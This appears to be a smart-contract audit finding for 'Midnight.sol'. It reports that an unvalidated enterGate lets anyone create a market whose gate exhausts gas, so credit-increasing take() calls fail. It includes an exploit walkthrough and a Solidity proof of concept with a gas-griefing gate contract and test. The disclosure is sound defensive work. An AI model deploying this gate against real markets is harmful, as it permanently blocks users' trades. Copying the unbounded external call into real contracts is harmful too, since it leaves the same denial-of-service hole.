### Title
Unbounded gas consumption in `IEnterGate.canIncreaseCredit` external call enables low-cost DoS of all credit-increasing takes in a gated market - (File: src/Midnight.sol)

### Summary
`touchMarket()` imposes no restrictions on the `enterGate` address, allowing any unprivileged market creator to register a market whose gate's `canIncreaseCredit` implementation burns arbitrarily large amounts of gas. Because `take()` calls `IEnterGate(offer.market.enterGate).canIncreaseCredit(buyer)` with no gas cap, a malicious gate can exhaust the transaction's gas budget before position state is updated, permanently DoS-ing all credit-increasing takes in that market.

### Finding Description
**Code path:**

`touchMarket()` at [1](#0-0)  validates only `maturity`, `collateralParams` length, sort order, `lltv`, and `maxLif`. The `enterGate` field of the `Market` struct is accepted without any validation — no code-size check, no interface probe, no allowlist.

Inside `take()`, after computing `buyerCreditIncrease`, the gate is invoked at: [2](#0-1) 

This is a plain Solidity external call (compiled to `staticcall` because the interface declares `view`). Under EIP-150, the callee receives all remaining gas minus 1/64. There is no `{gas: N}` stipend. If the callee consumes all gas forwarded to it, the caller retains only 1/64 of the pre-call gas — insufficient to execute the position updates at: [3](#0-2) 

**Attacker inputs and exploit flow:**

1. Attacker deploys `GasGriefGate` whose `canIncreaseCredit` iterates over a large `uint256[]` storage array (e.g., 50 000 slots), consuming ~30 M gas per call.
2. Attacker calls `touchMarket(market)` with `market.enterGate = address(GasGriefGate)`. `touchMarket` succeeds — no gate validation exists.
3. Attacker (or a colluding maker) posts a buy offer in this market with attractive terms.
4. Any victim taker calls `take()` with `offer.buy = true` and `units > buyerPos.debt` (so `buyerCreditIncrease > 0`).
5. Execution reaches line 399; `canIncreaseCredit(buyer)` is dispatched with ~all remaining gas.
6. The gate loop exhausts the forwarded gas; the entire `take()` reverts with out-of-gas before any position state is written.

**Why existing checks fail:**

- `touchMarket()` has no `enterGate` validation. [4](#0-3) 
- The `IEnterGate` interface declares `canIncreaseCredit` as `view`, but `view` only prevents state mutation — it does not bound gas consumption. [5](#0-4) 
- The short-circuit `offer.market.enterGate == address(0) || buyerCreditIncrease == 0` only skips the call when the gate is zero or no credit increase occurs; neither condition holds in the attack scenario. [2](#0-1) 

### Impact Explanation
Every `take()` call in the gated market where `buyerCreditIncrease > 0` reverts with out-of-gas. No credit-increasing take can ever succeed in that market. The attacker's cost is one contract deployment and one `touchMarket` call; the DoS is permanent and affects all participants in the market.

### Likelihood Explanation
Market creation is permissionless — any address can call `touchMarket` with an arbitrary `enterGate`. The attacker needs only to post a sufficiently attractive offer (e.g., favorable tick) to draw takers into the poisoned market. The attack is repeatable at negligible cost (the gate is already deployed; new markets with the same gate can be created for different maturities or collaterals). No privileged access, oracle manipulation, or user error is required.

### Recommendation
Add a hard gas cap to both gate calls in `take()`:

```solidity
// Replace the plain external call with a gas-capped low-level staticcall
(bool ok, bytes memory ret) =
    offer.market.enterGate.staticcall{gas: GATE_GAS_LIMIT}(
        abi.encodeCall(IEnterGate.canIncreaseCredit, (buyer))
    );
require(ok && abi.decode(ret, (bool)), BuyerGatedFromIncreasingCredit());
```

Apply the same pattern to the `canIncreaseDebt` call. Define `GATE_GAS_LIMIT` as a protocol constant (e.g., 100 000 gas) sufficient for any reasonable whitelist implementation. Optionally, add a code-size check on `enterGate` in `touchMarket()` to reject EOA addresses.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IEnterGate} from "src/interfaces/IGate.sol";
import {BaseTest} from "test/BaseTest.sol";
import {Market, Offer, CollateralParams} from "src/interfaces/IMidnight.sol";

contract GasGriefGate is IEnterGate {
    uint256[] public bloat;

    constructor(uint256 slots) {
        bloat = new uint256[](slots);
        for (uint256 i; i < slots; i++) bloat[i] = i + 1;
    }

    function canIncreaseCredit(address) external view returns (bool) {
        uint256 acc;
        for (uint256 i; i < bloat.length; i++) acc += bloat[i]; // ~30M gas at 50k slots
        return acc > 0; // always true, but OOG before returning
    }

    function canIncreaseDebt(address) external view returns (bool) { return true; }
}

contract GasGriefTest is BaseTest {
    function testGasGriefGateDosTake() public {
        // 1. Deploy malicious gate
        GasGriefGate gate = new GasGriefGate(50_000);

        // 2. Create market with malicious gate (touchMarket has no gate validation)
        Market memory m;
        m.loanToken      = address(loanToken);
        m.maturity       = block.timestamp + 100;
        m.enterGate      = address(gate);
        m.collateralParams.push(CollateralParams({
            token: address(collateralToken1),
            lltv: 0.77e18,
            oracle: address(oracle1),
            maxLif: maxLif(0.77e18, LIQUIDATION_CURSOR_LOW)
        }));
        midnight.touchMarket(m);

        // 3. Set up a buy offer (lender is maker, borrower is taker)
        Offer memory offer;
        offer.buy     = true;
        offer.maker   = lender;
        offer.market  = m;
        offer.ratifier = address(dummyRatifier);
        offer.expiry  = block.timestamp + 200;
        offer.tick    = MAX_TICK;
        offer.maxUnits = type(uint256).max;

        uint256 units = 1e18;
        collateralize(m, borrower, units);
        deal(address(loanToken), lender, units * 2);

        // 4. Victim taker calls take() — buyerCreditIncrease > 0 triggers canIncreaseCredit
        vm.prank(borrower);
        // Assert: take() reverts with out-of-gas (or EvmError) before position updates
        (bool success,) = address(midnight).call{gas: 15_000_000}(
            abi.encodeCall(midnight.take, (offer, hex"", units, borrower, borrower, address(0), hex""))
        );
        assertFalse(success, "take must revert OOG due to gas griefing gate");

        // Assert: no position state was written (credit remains 0)
        assertEq(midnight.creditOf(toId(m), lender), 0, "no credit should be minted");
    }
}
```

**Expected assertions:** `success == false` (OOG revert), `creditOf(id, lender) == 0` confirming no state was committed before the revert.
